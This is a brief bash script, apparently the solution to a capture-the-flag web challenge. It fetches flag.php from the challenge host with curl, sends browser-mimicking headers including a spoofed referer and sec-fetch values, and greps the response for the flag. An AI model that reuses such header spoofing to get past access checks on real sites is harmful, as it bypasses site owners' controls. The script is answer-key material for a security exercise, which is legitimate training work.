#!/bin/bash
curl 'https://web4.chujowyc.tf/flag.php' \
  -H 'authority: web4.chujowyc.tf' \
  -H 'upgrade-insecure-requests: 1' \
  -H 'dnt: 1' \
  -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36' \
  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: navigate' \
  -H 'sec-fetch-user: ?1' \
  -H 'sec-fetch-dest: document' \
  -H 'referer: https://web4.chujowyc.tf/' \
  -H 'accept-language: en-IN,en-US;q=0.9,en;q=0.8,hi-IN;q=0.7,hi;q=0.6,en-GB;q=0.5' \
  --compressed 2> /dev/null | grep chCTF


